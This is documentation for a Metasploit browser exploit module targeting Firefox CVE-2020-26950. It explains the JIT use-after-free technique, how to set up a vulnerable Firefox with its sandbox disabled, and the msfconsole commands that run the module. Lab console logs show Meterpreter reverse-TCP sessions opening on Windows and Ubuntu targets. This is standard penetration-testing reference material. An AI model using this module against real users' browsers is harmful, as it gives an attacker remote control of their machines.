## Vulnerable Application

This modules exploits CVE-2020-26950, a use after free exploit in Firefox.
The MCallGetProperty opcode can be emitted with unmet assumptions resulting
in an exploitable use-after-free condition.

This exploit uses a somewhat novel technique of spraying ArgumentsData
structures in order to construct primitives. The shellcode is forced into
executable memory via the JIT compiler, and executed by writing to the JIT
region pointer.

This exploit does not contain a sandbox escape, so firefox must be run
with the MOZ_DISABLE_CONTENT_SANDBOX environment variable set, in order
for the shellcode to run successfully.

This vulnerability affects Firefox < 82.0.3, Firefox ESR < 78.4.1, and
Thunderbird < 78.4.2, however only Firefox < 82 is supported as a target.
Additional work may be needed to support other versions such as Firefox 82.0.1.

**Vulnerable Application Installation Steps**

You can download and run a vulnerable firefox version on Linux with the following commands:
```
wget https://ftp.mozilla.org/pub/firefox/releases/79.0/linux-x86_64/en-US/firefox-79.0.tar.bz2
tar xvf firefox-79.0.tar.bz2
cd firefox
MOZ_DISABLE_CONTENT_SANDBOX=1 ./firefox
```

You can also download a vulnerable firefox version for Windows from the following location:
[https://ftp.mozilla.org/pub/firefox/releases/79.0/win64/en-US/](https://ftp.mozilla.org/pub/firefox/releases/79.0/win64/en-US/)

## Verification Steps

1. Do: `use exploit/multi/browser/firefox_jit_use_after_free`
1. Do: `set payload [PAYLOAD]`
1. Do: `set URIPATH /`
1. Do: `set LHOST [IP]`
1. Do: `set SRVHOST [IP]`
1. Do: `exploit`

## Options

### DEBUG_EXPLOIT

Show debug information during exploitation.  This will display details of the exploit during exploitation, which is useful for debugging.

## Scenarios


### Windows 10 and Firefox 79.0 with MOZ_DISABLE_CONTENT_SANDBOX=1

Start firefox without a sandbox with the following .bat file:
```
@echo off
set MOZ_DISABLE_CONTENT_SANDBOX=1
"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
```


```
msf6 > use exploit/multi/browser/firefox_jit_use_after_free
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set URIPATH /
URIPATH => /
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set SRVHOST 192.168.56.1
SRVHOST => 192.168.56.1
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(multi/browser/firefox_jit_use_after_free) >
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Using URL: http://192.168.56.1:8080/
[*] Server started.
[*] 192.168.56.3     firefox_jit_use_after_free - Sending / to Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
[*] Sending stage (200262 bytes) to 192.168.56.3
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.3:49737 ) at 2022-02-16 08:23:53 +0000

```

### Ubuntu 18 and Firefox 79.0 with MOZ_DISABLE_CONTENT_SANDBOX=1 and DEBUG_EXPLOIT enabled

Start Firefox without a sandbox, e.g:
`MOZ_DISABLE_CONTENT_SANDBOX=1 ./firefox`

```
msf6 > use exploit/multi/browser/firefox_jit_use_after_free
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set URIPATH /
URIPATH => /
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set LHOST 192.168.56.1
LHOST => 192.168.56.1
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set SRVHOST 192.168.56.1
SRVHOST => 192.168.56.1
msf6 exploit(multi/browser/firefox_jit_use_after_free) > set DEBUG_EXPLOIT true
DEBUG_EXPLOIT => true
msf6 exploit(multi/browser/firefox_jit_use_after_free) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/browser/firefox_jit_use_after_free) >
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] Using URL: http://192.168.56.1:8080/
[*] Server started.
[*] 192.168.56.1     firefox_jit_use_after_free - Sending / to Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
[*] 192.168.56.1     firefox_jit_use_after_free - [+] got the corrupted array 16384
[*] 192.168.56.1     firefox_jit_use_after_free - [+] Leaked nursery location: 4aee8a4f6d8
[*] 192.168.56.1     firefox_jit_use_after_free - [+] AD location: 7f27fb9cc000
[*] 192.168.56.1     firefox_jit_use_after_free - [+] AB Location: 7f27e7200000
[*] 192.168.56.1     firefox_jit_use_after_free - [+] Function is at: 10d4c755fac0
[*] 192.168.56.1     firefox_jit_use_after_free - [+]   jitinfo: 10d4c7564150
[*] 192.168.56.1     firefox_jit_use_after_free - [+]   RX Region: 3774356d0e50
[*] 192.168.56.1     firefox_jit_use_after_free - [+] Shellcode start: 3774356d1030
[*] 192.168.56.1     firefox_jit_use_after_free - [*] Triggering...
[*] Sending stage (3020772 bytes) to 192.168.56.1
[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.1:34946 ) at 2022-02-16 08:18:11 +0000
```
